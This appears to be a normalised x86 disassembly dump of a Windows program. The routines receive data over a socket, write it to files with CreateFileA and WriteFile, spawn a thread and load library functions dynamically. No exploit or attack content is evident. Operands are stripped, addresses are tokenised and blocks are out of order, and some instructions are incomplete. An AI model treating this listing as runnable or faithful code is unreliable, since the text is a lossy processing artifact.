mov dl [ edi + 0x1b ]
mov cl [ edi + 0x1d ]
mov [ esp + 0x81 ] al
mov [ esp + 0x80 ] dl
mov dl [ edi + 0x1e ]
lea eax [ esp + 0x80 ]
push eax
mov [ esp + 0x86 ] cl
mov [ esp + 0x87 ] dl
mov [ esp + 0x88 ] 0x0
call j_sub_4b692d
mov cl [ edi + 0x20 ]
mov dl [ edi + 0x21 ]
mov [ esp + 0x8c ] ax
lea eax [ esp + 0x6c ]
push eax
mov [ esp + 0x70 ] cl
mov [ esp + 0x71 ] dl
mov [ esp + 0x72 ] 0x0
call j_sub_4b692d
mov cl [ edi + 0x23 ]
mov dl [ edi + 0x24 ]
mov [ esp + 0x98 ] ax
lea eax [ esp + 0x7c ]
push eax
mov [ esp + 0x80 ] cl
mov [ esp + 0x81 ] dl
mov [ esp + 0x82 ] 0x0
call j_sub_4b692d
mov cl [ edi + 0x26 ]
mov dl [ edi + 0x27 ]
mov [ esp + 0x9e ] ax
lea eax [ esp + 0x7c ]
push eax
mov [ esp + 0x80 ] cl
mov [ esp + 0x81 ] dl
mov [ esp + 0x82 ] 0x0
call j_sub_4b692d
mov esi [ esp + 0x24 ]
add esp 0x10
mov [ esp + 0x94 ] ax
mov [ esp + 0x96 ] 0x0
mov al [ esi ]
cmp al 0xd
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ esp + 0xa4 ]
mov ecx [ ebx + 0x60 ]
jl r-xdata
inc eax
push eax
push ecx
lea edx [ esp + 0x150 ]
push edx
call [ lstrcpynA@IAT ]
lea eax [ esp + 0x148 ]
push eax
call sub_4add10
mov ecx [ esp + 0x3c ]
mov [ esp + ecx * 8 + 0xa4 ] eax
mov [ esp + ecx * 8 + 0xa8 ] edx
mov edx [ esp + 0xb0 ]
add esp 0x4
cmp al 0x39
jg r-xdata
jg r-xdata
mov [ ebx + 0xa4 ] 0xffffffff
call esi
jmp r-xdata
mov [ ebx + 0xa4 ] 0xffffffff
call [ GetLastError@IAT ]
lea esi [ ebx + 0xd8 ]
push r--data
mov ecx esi
mov [ ebx + 0xa8 ] eax
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
push esi
push 0x80
push ecx
push esi
push 0x1
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edx eax
cmp edx 0xffffffff
mov [ esp + 0x64 ] edx
je r-xdata
mov eax [ ebx + 0xcc ]
test eax eax
jne r-xdata
lea eax [ esp + 0x38 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea ecx [ esp + eax + 0xb2c ]
push ecx
call sub_4aded0
mov esi [ esp + 0x24 ]
add esp 0x10
mov [ ebx + 0xa4 ] 0x2
jg r-xdata
mov eax [ ebx + 0xcc ]
test eax eax
jne r-xdata
cmp [ esp + 0x28 ] eax
jbe r-xdata
mov [ ebx + 0xa8 ] eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1b2c ] 0x0
call sub_4480e0
jmp r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov ecx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x180 ]
push eax
mov eax [ esp + 0x6c ]
push esi
lea edx [ esp + ecx + 0xb2c ]
push edx
push eax
call [ WriteFile@IAT ]
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x20 ]
mov edi [ ebx + 0xd4 ]
mov edx ecx
shr ecx 0x2
lea esi [ esp + esi + 0xb20 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
mov esi edx
jmp r-xdata
add eax 0x1
adc edx 0x0
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] edx
js r-xdata
mov [ ebx + 0xa4 ] 0x2
jmp r-xdata
sub ecx [ esp + 0xa0 ]
sbb eax [ esp + 0xa4 ]
mov [ esp + 0x3c ] eax
js r-xdata
cmp ecx [ esp + 0xa0 ]
jb r-xdata
mov esi [ rw-data ]
mov ecx [ ebx + 0x48 ]
mov eax esi
cdq
add eax ecx
adc edx [ ebx + 0x4c ]
cmp edx [ esp + 0x2c ]
jl r-xdata
mov ecx [ ebx + 0x48 ]
mov eax esi
cdq
add ecx eax
mov eax [ ebx + 0x4c ]
adc eax edx
mov [ ebx + 0x48 ] ecx
mov [ ebx + 0x4c ] eax
jmp r-xdata
mov [ ebx + 0xa4 ] 0xfffffffc
jg r-xdata
mov eax [ esp + 0xa4 ]
mov ecx [ esp + 0xa0 ]
mov [ ebx + 0x64 ] eax
mov eax [ esp + 0xa8 ]
mov [ ebx + 0x60 ] ecx
mov ecx eax
and ecx edx
cmp ecx 0xffffffff
jne r-xdata
jg r-xdata
mov eax [ ebx + 0xcc ]
test eax eax
mov ecx [ ebx + 0x4 ]
mov edi [ ebx + 0xd4 ]
mov [ esp + 0x14 ] ecx
jne r-xdata
jg r-xdata
mov eax [ rw-data ]
push 0x0
cdq
push 0x100000
push edx
push eax
call sub_4b6490
cmp [ esp + 0x2c ] edx
jl r-xdata
test eax eax
jbe r-xdata
cmp ecx 0x1000
jbe r-xdata
push rw-data
lea ecx [ esp + 0x170 ]
call sub_4014e0
mov edx [ esp + 0x14 ]
push 0x0
push esi
push edi
push edx
call [ recv@IAT ]
mov esi eax
lea ecx [ esp + 0x16c ]
mov [ esp + 0x24 ] esi
call sub_404410
cmp esi 0xffffffff
je r-xdata
add edi [ ebx + 0x48 ]
mov eax [ ebx + 0x48 ]
mov esi edi
sub esi eax
cmp eax edi
jbe r-xdata
jg r-xdata
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0xcc ]
test eax eax
jne r-xdata
cmp [ esp + 0x28 ] eax
jbe r-xdata
lea esi [ ebx + 0xd8 ]
mov ecx esi
push r--data
mov [ ebx + 0xa8 ] eax
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
cmp [ esp + 0x30 ] 0x1
jne r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov edx [ ebx + 0x88 ]
or edx [ ebx + 0x8c ]
jne r-xdata
mov ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov [ ebx + 0x60 ] ecx
mov ecx [ esp + 0x34 ]
mov [ ebx + 0x64 ] edx
cmp ecx [ ebx + 0x24 ]
jne r-xdata
mov eax [ ebx + 0xcc ]
test eax eax
je r-xdata
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push edi
call sub_4aded0
mov esi [ esp + 0x34 ]
add esp 0x10
mov [ esp + 0x60 ] 0xe
mov eax [ ebx + 0x48 ]
mov ecx [ ebx + 0x4c ]
mov [ ebx + 0x88 ] eax
mov [ ebx + 0x8c ] ecx
mov ecx [ ebx + 0x64 ]
test ecx ecx
jl r-xdata
mov ecx [ ebx + 0x4c ]
mov eax esi
mov esi [ ebx + 0x48 ]
cdq
add esi eax
mov eax [ esp + 0x2c ]
adc ecx edx
mov edx ecx
cmp edx eax
mov [ ebx + 0x48 ] esi
mov [ ebx + 0x4c ] ecx
jg r-xdata
mov edi [ ebx + 0xd4 ]
push rw-data
lea ecx [ esp + 0x168 ]
call sub_4014e0
mov ecx [ esp + 0x64 ]
push 0x0
lea eax [ esp + 0xd0 ]
push eax
push esi
push edi
push ecx
call [ WriteFile@IAT ]
lea ecx [ esp + 0x164 ]
call sub_404410
cmp [ esp + 0xcc ] esi
jne r-xdata
cmp eax 0xfffffffe
jg r-xdata
jl r-xdata
mov [ ebx + 0xa4 ] 0xffffffff
call [ GetLastError@IAT ]
mov [ esp + 0x60 ] 0xf
mov ecx [ ebx + 0x60 ]
test ecx ecx
jbe r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov eax esi
cmp eax ecx
jae r-xdata
mov edi [ esp + 0x28 ]
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
sub_4b1c90
push 0xffffffff
push sub_4c1fb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
xor ebx ebx
mov [ esp + 0x8 ] ebx
call sub_4af730
test eax eax
jne r-xdata
push ebp
push esi
mov ecx rw-data
push edi
mov [ esp + 0x1c ] ecx
call sub_404310
mov ebp [ esp + 0x34 ]
mov [ esp + 0x28 ] ebx
xor edi edi
jmp r-xdata
or eax 0xffffffff
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
mov ecx [ rw-data ]
cmp ecx ebx
mov edx [ rw-data ]
jne r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov esi [ ecx + edi * 4 ]
mov eax ebp
add esi 0x8
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
cmp edi eax
jge r-xdata
sub edx ecx
sar edx 0x2
mov eax edx
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
mov eax [ esi + 0x14 ]
push ebp
push eax
push ebx
mov ecx esi
call sub_401150
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
cmp eax ebx
mov [ esp + 0x14 ] 0x1
jne r-xdata
push 0x108
call sub_4b573e
add esp 0x4
cmp eax ebx
je r-xdata
cmp edi eax
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
inc edi
jmp r-xdata
mov ebp [ esp + 0x38 ]
cmp ebp ebx
mov esi [ ecx + edi * 4 ]
je r-xdata
mov ecx rw-data
call sub_401420
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
xor esi esi
mov [ eax + 0x1c ] ebx
mov ecx 0xf
mov [ eax + 0x20 ] ecx
mov [ eax + 0xc ] bl
mov [ eax + 0x80 ] ecx
mov [ eax + 0x7c ] ebx
mov [ eax + 0x6c ] bl
mov [ eax + 0xd0 ] ecx
mov [ eax + 0xcc ] ebx
mov [ eax + 0xbc ] bl
mov [ eax + 0xf0 ] ecx
mov [ eax + 0xec ] ebx
mov [ eax + 0xdc ] bl
mov esi eax
jmp r-xdata
mov edx [ esp + 0x40 ]
mov ebp [ esp + 0x30 ]
mov [ esi + 0x100 ] edx
mov [ esi + 0xb0 ] ebp
cmp [ esi + 0x24 ] eax
je r-xdata
cmp [ esi + 0xcc ] ebx
jne r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
mov ecx rw-data
call sub_401420
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
cmp esi ebx
mov [ esp + 0x10 ] esi
jne r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
mov [ esi + 0x24 ] eax
mov [ esi + 0xa4 ] ebx
mov eax [ esi + 0xac ]
cmp eax ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebp
lea ecx [ esi + 0x8 ]
call sub_401e80
mov eax [ rw-data ]
mov [ esi ] eax
mov [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x88 ] ebx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x90 ] bx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x60 ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0xa4 ] ebx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0xd4 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xac ] ebx
mov ecx [ rw-data ]
inc eax
cmp ecx ebx
mov [ rw-data ] eax
jne r-xdata
cmp [ esi + 0xac ] ebx
jne r-xdata
mov ecx [ esi + 0x28 ]
cmp ecx 0xb
je r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp [ esi + 0x28 ] 0xe
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp [ esi + 0x24 ] 0x3
je r-xdata
push 0x1388
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0xac ]
push ecx
call [ CloseHandle@IAT ]
mov eax r--data
mov [ esi + 0xac ] ebx
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
cmp ecx 0xc
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebp
lea ecx [ esi + 0xb8 ]
call sub_401e80
cmp [ esi + 0x28 ] 0x8
je r-xdata
lea edi [ esi + 0xd8 ]
push r--data
mov ecx edi
call sub_402010
push r--data
mov ecx edi
call sub_402010
push ebx
push 0x80
push 0x2
push ebx
push 0x1
push 0x40000000
push ebp
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ecx rw-data
call sub_453720
mov esi [ esp + 0x10 ]
jmp r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
mov edx [ esp + 0x38 ]
cmp edx ebx
mov [ esi + 0xfc ] eax
mov [ esi + 0xf8 ] ebx
je r-xdata
mov [ esi + 0xb0 ] ebp
call [ GetTickCount@IAT ]
lea edx [ esp + 0x18 ]
push edx
push ebx
push esi
push sub_4afc00
push 0x10000
push ebx
mov [ esi + 0xa0 ] eax
call [ CreateThread@IAT ]
cmp eax ebx
mov [ esi + 0xac ] eax
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esi + 0xd8 ]
call sub_401cc0
mov [ esi + 0x28 ] ebx
cmp ecx 0xd
je r-xdata
mov eax [ esp + 0x3c ]
mov eax [ esi + 0xd4 ]
push ebx
lea edx [ esp + 0x1c ]
push edx
push eax
call [ LocalSize@IAT ]
mov ecx [ esi + 0xd4 ]
mov edx [ esp + 0x18 ]
push eax
push ecx
push edx
call [ WriteFile@IAT ]
mov eax [ esi + 0xd4 ]
push eax
call [ LocalSize@IAT ]
cmp [ esp + 0x18 ] eax
push r--data
mov ecx edi
je r-xdata
push r--data
mov ecx edi
call sub_402010
push r--data
mov ecx edi
call sub_402010
push ebp
mov ecx edi
call sub_402010
push r--data
mov ecx edi
call sub_402010
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push edx
lea ecx [ esi + 0xb8 ]
call sub_401e80
push ebx
lea eax [ esi + 0xd8 ]
push eax
push esi
call sub_4aee20
mov eax [ esi + 0xb0 ]
mov edi [ PostMessageA@IAT ]
add esp 0xc
cmp eax ebx
je r-xdata
mov [ esi + 0xa4 ] 0xffffffff
call [ GetLastError@IAT ]
mov [ esi + 0xa8 ] eax
cmp ecx 0xe
je r-xdata
call sub_402010
push r--data
call sub_402010
push r--data
jmp r-xdata
cmp [ esi + 0xac ] ebx
jne r-xdata
push esi
push ebx
push 0x1700
push eax
call edi
cmp ecx 0xf
je r-xdata
mov ecx edi
call sub_402010
mov ecx edi
push ebp
call sub_402010
mov ecx edi
push r--data
call sub_402010
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0xd8 ]
push r--data
mov ecx edi
call sub_402010
push r--data
mov ecx edi
call sub_402010
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push esi
push ebx
push 0x1703
push eax
call edi
push 0x2
push eax
call [ shutdown@IAT ]
mov eax [ esi + 0x28 ]
cmp eax 0x3
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call [ closesocket@IAT ]
mov [ esi + 0x4 ] 0xffffffff
jmp r-xdata
cmp eax 0x2
jne r-xdata
sub_4b2200
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp eax ecx
je r-xdata
retn
mov edx [ esp + 0xc ]
push esi
mov esi [ edx ]
mov [ eax ] esi
add eax 0x4
cmp eax ecx
jne r-xdata
pop esi
sub_4b2220
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
mov [ esi ] r--data
je r-xdata
cmp [ esi + 0x20 ] 0x10
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
mov eax [ esi + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4b2260
push ecx
push esi
xor eax eax
push 0xffffffff
mov esi edx
add ecx 0x8
push eax
push ecx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov ecx esi
mov [ esp + 0x10 ] eax
mov [ esi + 0x4 ] al
call sub_401dd0
mov eax esi
pop esi
pop ecx
retn
sub_4b2290
push 0xffffffff
push sub_4c1ffb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ esi + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edi
mov [ esp + 0xc ] esi
mov [ ecx + 0x4 ] bl
mov eax r--data
mov [ esp + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
push r--data
call sub_401e80
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4b2300
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
push edi
je r-xdata
mov edi [ esp + 0xc ]
push edi
call [ LoadLibraryA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x4 ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax ]
test eax eax
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x4
pop edi
pop esi
retn 0x4
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ esi + 0x8 ]
call sub_401e80
xor eax eax
sub_4b2360
push esi
push edi
mov edi [ GetProcAddress@IAT ]
mov esi ecx
mov eax [ esi + 0x4 ]
push r--data
push eax
mov [ esi + 0x24 ] 0x0
call edi
mov ecx [ esi + 0x4 ]
push r--data
push ecx
mov [ esi + 0x28 ] eax
call edi
mov edx [ esi + 0x4 ]
push r--data
push edx
mov [ esi + 0x30 ] eax
call edi
mov [ esi + 0x34 ] eax
mov eax [ esi + 0x4 ]
push r--data
push eax
call edi
mov ecx [ esi + 0x4 ]
push r--data
push ecx
mov [ esi + 0x38 ] eax
call edi
mov edx [ esi + 0x4 ]
push r--data
push edx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
mov eax [ esi + 0x4 ]
push r--data
push eax
call edi
mov ecx [ esi + 0x4 ]
push r--data
push ecx
mov [ esi + 0x44 ] eax
call edi
mov edx [ esi + 0x4 ]
push r--data
push edx
mov [ esi + 0x48 ] eax
call edi
mov [ esi + 0x2c ] eax
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov edi [ esi + 0x24 ]
xor eax eax
test edi edi
setne al
pop edi
pop esi
dec eax
and eax 0xfffffffe
retn
or [ esi + 0x24 ] 0x1
or [ esi + 0x24 ] 0x2
sub_4b2460
push 0xffffffff
push sub_4c2018
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4b24e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c2041
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x20
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
cmp edi [ ebp + 0xc ]
je r-xdata
sub_4b254c
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp esi edi
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x20
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4b25a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c2050
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_4b2460
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_4b2840
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_448150
add esp 0x14
mov eax esi
pop esi
retn
sub_4b2880
push ebp
mov ebp esp
push 0xffffffff
push sub_4c2071
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
dec ecx
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x8 ] esi
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
